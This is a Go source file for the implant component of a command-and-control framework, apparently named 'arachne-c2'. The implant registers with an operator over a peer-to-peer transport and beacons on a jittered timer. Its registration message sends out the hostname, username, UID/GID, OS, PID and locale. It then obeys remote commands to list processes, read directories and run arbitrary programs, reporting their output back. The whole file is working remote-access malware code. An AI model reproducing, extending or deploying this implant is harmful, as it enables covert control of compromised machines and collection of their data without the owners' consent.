package core

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"time"

	"google.golang.org/protobuf/proto"

	arachnepb "github.com/anomalyco/arachne-c2/protobuf/arachnepb"
	"github.com/anomalyco/arachne-c2/pkg/cryptography"
	"github.com/anomalyco/arachne-c2/pkg/transport"
)

type Agent struct {
	node      *transport.Node
	messenger *transport.Messenger
	keys      *cryptography.ImplantKey
	config    AgentConfig
	ctx       context.Context
	cancel    context.CancelFunc
}

type AgentConfig struct {
	OperatorKeyFile  string
	BeaconInterval   time.Duration
	BeaconJitter     time.Duration
	ReconnectBackoff time.Duration
}

func DefaultAgentConfig() AgentConfig {
	return AgentConfig{
		OperatorKeyFile:  "operator.pub",
		BeaconInterval:   30 * time.Second,
		BeaconJitter:     10 * time.Second,
		ReconnectBackoff: 5 * time.Second,
	}
}

func NewAgent(ctx context.Context, cfg AgentConfig) (*Agent, error) {
	ctx, cancel := context.WithCancel(ctx)

	pubKeyData, err := os.ReadFile(cfg.OperatorKeyFile)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("read operator key %s: %w", cfg.OperatorKeyFile, err)
	}

	operatorPub, err := cryptography.PubKeyFromBytes(pubKeyData)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("parse operator pubkey: %w", err)
	}

	keys, err := cryptography.GenerateImplantKey(operatorPub)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("generate implant key: %w", err)
	}

	nodeCfg := transport.NodeConfig{
		ListenAddr:  "/ip4/0.0.0.0/tcp/0",
		EnableRelay: true,
	}

	node, err := transport.NewNode(ctx, nodeCfg)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("create node: %w", err)
	}

	a := &Agent{
		keys:      keys,
		node:      node,
		config:    cfg,
		ctx:       ctx,
		cancel:    cancel,
	}

	a.messenger = transport.NewImplantMessenger(ctx, node, keys)
	a.messenger.SetHandler(a.handleCommand)

	return a, nil
}

func (a *Agent) Start() error {
	log.Printf("[implant] PeerID: %s", a.node.ID().String())
	log.Printf("[implant] Operator PeerID: %s", a.keys.OperatorPubKey)

	if err := a.messenger.ListenCommands(a.ctx); err != nil {
		return fmt.Errorf("listen commands: %w", err)
	}

	go a.beaconLoop()

	return nil
}

func (a *Agent) beaconLoop() {
	t := a.messenger.BeaconTopic()
	first := true

	for {
		if first {
			a.sendBeaconRegister()
			first = false
		}

		jitter := time.Duration(rand.Int63n(int64(a.config.BeaconJitter)))
		sleep := a.config.BeaconInterval + jitter

		select {
		case <-a.ctx.Done():
			return
		case <-time.After(sleep):
			a.sendBeaconPing(t)
		}
	}
}

func (a *Agent) sendBeaconRegister() {
	hostname, _ := os.Hostname()
	reg := &arachnepb.Register{
		Name:     hostname,
		Hostname: hostname,
		Username: os.Getenv("USER"),
		UID:      fmt.Sprintf("%d", os.Getuid()),
		GID:      fmt.Sprintf("%d", os.Getgid()),
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		PID:      int32(os.Getpid()),
		Filename: os.Args[0],
		Version:  "0.1.0",
		Locale:   os.Getenv("LANG"),
	}

	data, err := proto.Marshal(reg)
	if err != nil {
		log.Printf("[implant] marshal register: %v", err)
		return
	}

	env := a.messenger.CreateSignedEnvelope(0, data)
	env.SenderKey = []byte(a.keys.PeerID)

	pubBytes, err := a.keys.PublicKey.Raw()
	if err == nil {
		env.SenderKey = pubBytes
	}

	topic := a.messenger.BeaconTopic()
	if err := a.messenger.SendEnvelope(a.ctx, topic, env); err != nil {
		log.Printf("[implant] send register: %v", err)
		return
	}

	log.Printf("[implant] registered with operator")
}

func (a *Agent) sendBeaconPing(topic string) {
	ping := &arachnepb.Ping{Nonce: int32(rand.Int31())}
	data, _ := proto.Marshal(ping)
	env := a.messenger.CreateSignedEnvelope(1, data)

	pubBytes, _ := a.keys.PublicKey.Raw()
	env.SenderKey = pubBytes

	if err := a.messenger.SendEnvelope(a.ctx, topic, env); err != nil {
		log.Printf("[implant] ping: %v", err)
	}
}

func (a *Agent) handleCommand(ctx context.Context, env *arachnepb.Envelope, from []byte) {
	switch env.Type {
	case 1:
		a.handlePs(env)
	case 2:
		a.handleLs(env)
	case 3:
		a.handleExecute(env)
	default:
		log.Printf("[implant] unknown cmd type=%d", env.Type)
	}
}

func (a *Agent) handlePs(env *arachnepb.Envelope) {
	result := &arachnepb.Ps{}
	result.Processes = listProcesses()

	data, _ := proto.Marshal(result)
	resp := a.messenger.CreateSignedEnvelope(1, data)
	topic := a.messenger.BeaconTopic()
	a.messenger.SendEnvelope(a.ctx, topic, resp)
}

func (a *Agent) handleLs(env *arachnepb.Envelope) {
	req := &arachnepb.LsReq{}
	if err := proto.Unmarshal(env.Data, req); err != nil {
		return
	}

	result := &arachnepb.Ls{Path: req.Path}
	entries, err := os.ReadDir(req.Path)
	if err != nil {
		result.Exists = false
	} else {
		result.Exists = true
		for _, e := range entries {
			info, _ := e.Info()
			fi := &arachnepb.FileInfo{
				Name:  e.Name(),
				IsDir: e.IsDir(),
			}
			if info != nil {
				fi.Size = info.Size()
				fi.ModTime = info.ModTime().Unix()
				fi.Mode = info.Mode().String()
			}
			result.Files = append(result.Files, fi)
		}
	}

	data, _ := proto.Marshal(result)
	resp := a.messenger.CreateSignedEnvelope(2, data)
	topic := a.messenger.BeaconTopic()
	a.messenger.SendEnvelope(a.ctx, topic, resp)
}

func (a *Agent) handleExecute(env *arachnepb.Envelope) {
	req := &arachnepb.ExecuteReq{}
	if err := proto.Unmarshal(env.Data, req); err != nil {
		return
	}

	result := &arachnepb.Execute{}
	cmd := exec.CommandContext(a.ctx, req.Path, req.Args...)
	if req.Output {
		out, err := cmd.CombinedOutput()
		if err != nil {
			result.Status = 1
			result.Stderr = []byte(err.Error())
		}
		result.Stdout = out
	} else {
		if err := cmd.Start(); err != nil {
			result.Status = 1
			result.Stderr = []byte(err.Error())
		} else {
			result.Pid = uint32(cmd.Process.Pid)
			go cmd.Wait()
		}
	}

	data, _ := proto.Marshal(result)
	resp := a.messenger.CreateSignedEnvelope(3, data)
	topic := a.messenger.BeaconTopic()
	a.messenger.SendEnvelope(a.ctx, topic, resp)
}

func (a *Agent) Close() error {
	a.cancel()
	return a.node.Close()
}
